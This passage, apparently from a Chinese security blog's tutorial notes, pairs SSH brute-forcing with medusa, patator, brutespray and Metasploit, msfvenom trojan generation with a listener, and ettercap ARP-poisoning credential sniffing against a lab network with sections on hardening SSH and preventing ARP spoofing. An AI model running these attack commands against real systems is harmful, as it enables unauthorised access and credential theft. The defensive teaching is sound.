<h3 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h</span><br></pre></td></tr></table></figure>
<h3 id="破解-SSH-密码"><a href="#破解-SSH-密码" class="headerlink" title="破解 SSH 密码"></a>破解 SSH 密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -M ssh -h 192.168.50.129 -u root -P pw.txt</span><br><span class="line">medusa -M ssh -H hostlist.txt -U userlist.txt -P pw.txt</span><br><span class="line"><span class="comment"># -t 添加线程</span></span><br><span class="line"><span class="comment"># -O 输出到文件</span></span><br></pre></td></tr></table></figure>
<p><img src="medusa-owaspbwa.png"></p>
<h2 id="patator"><a href="#patator" class="headerlink" title="patator"></a>patator</h2><blockquote>
<p>强大的命令行暴力破解器</p>
<p>A Powerful Command-line Brute-forcer</p>
</blockquote>
<h3 id="可用模块-amp-破解-SSH-密码"><a href="#可用模块-amp-破解-SSH-密码" class="headerlink" title="可用模块 &amp; 破解 SSH 密码"></a>可用模块 &amp; 破解 SSH 密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看ssh_login模块</span></span><br><span class="line">patator ssh_login --<span class="built_in">help</span></span><br><span class="line">patator ssh_login host=192.168.50.129 user=root password=FILE0 0=passlist.txt</span><br><span class="line">patator ssh_login host=192.168.50.129 user=FILE0 0=userlist.txt password=FILE1 1=passlist.txt</span><br><span class="line">patator ssh_login host=192.168.50.129 user=root password=FILE0 0=passlist.txt -x ignore:mesg=<span class="string">&#x27;Authentication failed.&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="patator.png"></p>
<h2 id="BruteSpray"><a href="#BruteSpray" class="headerlink" title="BruteSpray"></a>BruteSpray</h2><blockquote>
<p>BruteSpray 是一款基于 nmap 扫描输出的 gnmap/XML 文件，自动调用 Medusa 对服务进行爆破(Medusa 是一款端口爆破工具，速度比 Hydra 快)</p>
</blockquote>
<h3 id="Kali-安装"><a href="#Kali-安装" class="headerlink" title="Kali 安装"></a>Kali 安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install brutespray</span><br></pre></td></tr></table></figure>
<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p22 192.168.50.0/24 -oX 22.xml</span><br><span class="line">brutespray --file 22.xml -U userlist.txt -P passlist.txt --threads 5 --hosts 5</span><br><span class="line">cat /root/brutespray.output/ssh.success.txt</span><br><span class="line"><span class="comment"># -c </span></span><br></pre></td></tr></table></figure>
<p><img src="brutespray.png"></p>
<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote>
<p>渗透测试框架</p>
<p><a href="http://www.metasploit.com/">www.metasploit.com</a></p>
<p>Metasploit Framework(MSF)是一个编写、测试和使用 exploit 代码的完善环境，这个环境为渗透测试、Shellcode 编写和漏洞研究提供了一个可靠平台，这个框架主要是面向对象的 Perl 编程语言编写，并带有由 C 语言、汇编程序和 Python 编写的可选组件</p>
<hr>
<p>探测发现(端口、服务、漏洞)</p>
<p>漏洞验证、攻击、载核</p>
<p>编码混淆</p>
<hr>
<p>Free &amp; Pro</p>
<ol>
<li>命令行 - GUI</li>
<li>手动 - 自动</li>
<li>AV(反病毒软件) - AntiAV</li>
</ol>
</blockquote>
<h3 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h3><h4 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示漏洞模块</span></span><br><span class="line">msf &gt; show exploits</span><br><span class="line"><span class="comment"># 选择excellent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择某个模块下的漏洞，自动补全</span></span><br><span class="line">use exploit/windows/smb/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填写攻击信息</span></span><br><span class="line"><span class="comment"># 攻击成功，就会执行payload中的指令</span></span><br><span class="line">show payloads</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示信息</span></span><br><span class="line">msf &gt; show info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动攻击</span></span><br><span class="line">exploit</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h4 id="SSH-模块"><a href="#SSH-模块" class="headerlink" title="SSH 模块"></a>SSH 模块</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search ssh</span><br></pre></td></tr></table></figure>
<h4 id="SSH-用户枚举"><a href="#SSH-用户枚举" class="headerlink" title="SSH 用户枚举"></a>SSH 用户枚举</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; <span class="built_in">set</span> USER_FILE /root/userlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_enumusers) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-userenumusers.png"></p>
<h4 id="SSH-版本探测"><a href="#SSH-版本探测" class="headerlink" title="SSH 版本探测"></a>SSH 版本探测</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-sshversion.png"></p>
<h4 id="SSH-暴力破解"><a href="#SSH-暴力破解" class="headerlink" title="SSH 暴力破解"></a>SSH 暴力破解</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.50.129</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> USER_FILE /root/userlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/passlist.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></pre></td></tr></table></figure>
<p><img src="msf-sshlogin.png"></p>
<hr>
<h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><ul>
<li>会话管理</li>
</ul>
<hr>
<h3 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h3><ul>
<li><p>payload 生成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="生成木马后门"><a href="#生成木马后门" class="headerlink" title="生成木马后门"></a>生成木马后门</h4><ul>
<li><p>生成木马后门</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p payload类型 LHOST=10.211.55.2 LPORT=4444 -f exe &gt; shell.exe</span><br><span class="line">-p     指定payload类型</span><br><span class="line">LHOST  控制端的IP，能够连到</span><br><span class="line">LPORT  控制端的端口</span><br><span class="line">-f     指定文件格式</span><br></pre></td></tr></table></figure></li>
<li><p>生成木马后门连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="comment"># 本地需要监听木马中设定的IP，才能测试木马的工作</span></span><br><span class="line"><span class="built_in">set</span> LHOST &lt;Local IP&gt;</span><br><span class="line"><span class="comment"># 同理端口</span></span><br><span class="line"><span class="built_in">set</span> LPORT &lt;Local Port&gt;</span><br><span class="line">run / exploit</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><ul>
<li>混淆 payloads - 绕过杀毒软件等</li>
</ul>
<hr>
<h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><ol>
<li><p>useradd shell ⭐</p>
<p>对于不需要登录的用户，需要/sbin/nologin，无需给他可登录的 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useraddd xxx -s /sbin/nologin</span><br><span class="line"><span class="comment"># 一般都是 /bin/bash</span></span><br></pre></td></tr></table></figure></li>
<li><p>密码的复杂性 ⭐</p>
<p>字母大小写 + 数字 + 特殊字符 + 20 位以上 + 定期更换</p>
</li>
<li><p>修改默认端口 ⭐</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"><span class="comment"># Port 22222</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh_config 客户端文件 sshd_config服务器文件</span></span><br><span class="line"><span class="comment"># 0-65535很难全部扫描</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存指纹信息</span></span><br><span class="line">vim .ssh/known_hosts</span><br><span class="line"><span class="comment"># 实现当第一次连接服务器时，自动接受新的公钥</span></span><br><span class="line">vim /etc/ssh/ssh_config</span><br><span class="line"><span class="comment"># StrictHostKeyChecking no</span></span><br></pre></td></tr></table></figure></li>
<li><p>限制登录的用户或组 ⭐</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config </span><br><span class="line"><span class="comment">#PermitRootLogin yes</span></span><br><span class="line"><span class="comment"># Allowusers xxx</span></span><br><span class="line"><span class="comment"># ssh 192.168.50.129 -l xxx</span></span><br><span class="line"></span><br><span class="line">man sshd_config</span><br><span class="line"><span class="comment"># AllowUsers AllowGroups DenyUsers DenyGroups</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用 sudo ⭐</p>
<p>平时都使用 root 用户的做法是不对的，权限过大</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">visudo</span><br></pre></td></tr></table></figure></li>
<li><p>设置允许的 IP 访问 - 过于陈旧的方法【可选】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/hosts.allow </span><br><span class="line"><span class="comment"># sshd:192.168.50.129:allow</span></span><br><span class="line"><span class="comment"># sshd:all:allow</span></span><br><span class="line">PAM基于IP限制 <span class="comment"># 少用</span></span><br><span class="line">iptables/firewalld</span><br><span class="line">只能允许从堡垒机/跳板机 <span class="comment"># 所有业务限定从跳板机访问</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用软件 DenyHosts 自动统计，只要某个 ip 登录错误三次，就将其加入到/etc/hosts.deny，但不会自动解锁(管理员忘了就完了)</p>
</li>
<li><p>基于 PAM 实现登录限制⭐【稳】</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">模块：pam_tally2.so</span><br><span class="line">功能：登录统计</span><br><span class="line">示例：实现防止对sshd暴力破解</span><br><span class="line"># pam服务适用于身份验证的第三方服务</span><br><span class="line"></span><br><span class="line">grep tally2 /etc/pam.d/sshd</span><br><span class="line"># vim /etc/pam.d/sshd</span><br><span class="line"># 在最前面加一行 无论什么身份 只要失败两次 就锁定30s</span><br><span class="line">auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=30 unlock_time=30</span><br><span class="line"># 日志查看方式: tail -f var/log/secure</span><br><span class="line"></span><br><span class="line">vim /etc/pam.d/su</span><br><span class="line"># 第一行如下：只要是root就可以随意进入，下面的限制都不用管了</span><br><span class="line">auth sufficient pam_rootok.so</span><br><span class="line"># 假设这一行被放入了/etc/pam.d/sshd中，则远程ssh登录无需正确密码即可登录</span><br></pre></td></tr></table></figure>
<p>暴力软件可能不会隔一段时间重新去尝试，只要发现无法爆破，可能会退出；爆破频率太低</p>
</li>
<li><p>禁用密码、改用公钥方式认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh localhost -v</span></span><br><span class="line"><span class="comment"># gssapi-keyex &gt; publickey &gt; password</span></span><br></pre></td></tr></table></figure></li>
<li><p>保护 xshell 导出会话文件【小心】</p>
<p>在 xshell 文件中保存了很多远程登录机器的信息，通过导出 &gt; 导出密码</p>
</li>
<li><p>GRUB(多操作系统启动程序)加密【针对本地破解】</p>
</li>
</ol>
<h1 id="中间人攻击以及防御"><a href="#中间人攻击以及防御" class="headerlink" title="中间人攻击以及防御"></a>中间人攻击以及防御</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>利用<strong>ARP 协议</strong>(将 IP 地址解析为 MAC 地址)进行中间人攻击</p>
<p><img src="arp-midt.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -a</span><br><span class="line">ping 192.168.50.128</span><br><span class="line"><span class="comment"># 查看arp报文</span></span><br><span class="line">tcpdump -i eth0 -nn arp</span><br><span class="line">tcpdump -i eth0 -nn arp and host 192.168.50.128</span><br></pre></td></tr></table></figure>
<p><img src="arp-pakage.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ettercap-graphical</span><br><span class="line">ettercap -G</span><br><span class="line"><span class="comment"># -G 代表图形化</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>Sniff &gt; Unified sniffing… &gt; eth0</p>
<p><img src="ettercap-sniffstart.png"></p>
</li>
<li><p>Hosts &gt; Host List（Scan for host） &gt; Add to Target1(其他机器)/2(网关)</p>
<p>Targets &gt; Current targets</p>
<p><img src="ettercap-target.png"></p>
</li>
<li><p>Mitm &gt; ARP poisoning… &gt; Sniff remote connections.</p>
<p><img src="mitm-attack.png"></p>
</li>
<li><p>被攻击的机器，之后用 arp -a 查看，发现原来网关的 IP 对应的是中间人攻击机器的 MAC 地址，说明攻击成功</p>
<p><img src="mitm-success.png"></p>
<p><img src="mitm-success-win.png"></p>
</li>
<li><p>当被攻击的机器登录一个采用明文协议传输的网站，中间人即可获得登录的用户名和密码</p>
<p><img src="mitm-arp.gif"></p>
</li>
</ul>
<h2 id="客户端防御"><a href="#客户端防御" class="headerlink" title="客户端防御"></a>客户端防御</h2><ul>
<li><p>对上网的行为和方式有一定基本保护，如配置防火墙、防 ARP 攻击软件等措施。</p>
<ul>
<li><p>对于 Windows 机器，不相信任何人告诉的 ARP 地址，将正确的网关地址固定下来，变为<strong>静态类型</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -d # 删除</span><br><span class="line"># 绑定IP/MAC</span><br><span class="line"># 法一 - 临时</span><br><span class="line">arp -s IP地址 MAC地址</span><br><span class="line"># 法二 - 永久</span><br><span class="line">netsh i i show <span class="keyword">in</span> # 找准网卡 - 本地连接</span><br><span class="line">netsh -c &quot;i i&quot; ad ne <span class="number">18</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">200</span> <span class="number">00</span>-aa-<span class="number">00</span>-<span class="number">62</span>-c6-<span class="number">09</span> store=active</span><br><span class="line"># <span class="number">18</span> Idx值 store=persistent</span><br><span class="line"># 删除</span><br><span class="line">netsh -c &quot;i i&quot; delete neighbors <span class="number">18</span></span><br></pre></td></tr></table></figure></li>
<li><p>对于 Linux 机器，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip neigh</span><br><span class="line">arp -s IP地址 MAC地址</span><br><span class="line"><span class="comment"># PERMANET STALE</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="服务器防御-⭐-HTTPS-实现网站数据加密"><a href="#服务器防御-⭐-HTTPS-实现网站数据加密" class="headerlink" title="服务器防御 ⭐ HTTPS 实现网站数据加密"></a>服务器防御 ⭐ HTTPS 实现网站数据加密</h2><blockquote>
<ul>
<li>HTTPS 加密机制</li>
<li>wordpress 环境准备</li>
<li>SSL 证书申请流程</li>
<li>SSL 证书使用及测试</li>
<li>Kali Linux 中间人攻击测试</li>
</ul>
</blockquote>
<h3 id="HTTPS-加密机制"><a href="#HTTPS-加密机制" class="headerlink" title="HTTPS 加密机制"></a>HTTPS 加密机制</h3><p>协议：网络协议的简称，网络协议是通信计算机双方必须共同遵守的一组约定(建立连接、互相识别)，只有遵守这个约定，计算机之间才能相互通信交流</p>
<p>HTTP</p>
<ul>
<li>获取服务器(其他电脑的一些文件)</li>
<li>简单快速：客户向服务器请求服务，只需传送请求方法和路径</li>
<li>灵活、无连接</li>
<li>明文协议</li>
<li>HTTP 协议潜在漏洞</li>
</ul>
<p>HTTPS</p>
<ul>
<li><p>即 HTTP over TLS/SSL，是一种<strong>加密信道</strong>进行 HTTP 内容传输的协议</p>
</li>
<li><p>HTTP/TCP/IP(HTTP)</p>
</li>
<li><p>HTTP/SSL 或者 TSL/TCP/IP(HTTPS)</p>
</li>
<li><p>原理</p>
<p><img src="https.png"></p>
<p><img src="https-explain.png"></p>
</li>
</ul>
<hr>
<h1 id="CC-攻击和-DDos-攻击的区别"><a href="#CC-攻击和-DDos-攻击的区别" class="headerlink" title="CC 攻击和 DDos 攻击的区别"></a>CC 攻击和 DDos 攻击的区别</h1><p>DDOS：针对网络，传统防火墙</p>
<p>CC：针对应用，waf</p>
]]></content>
      <tags>
        <tag>hacker</tag>
      </tags>
  </entry>
</search>
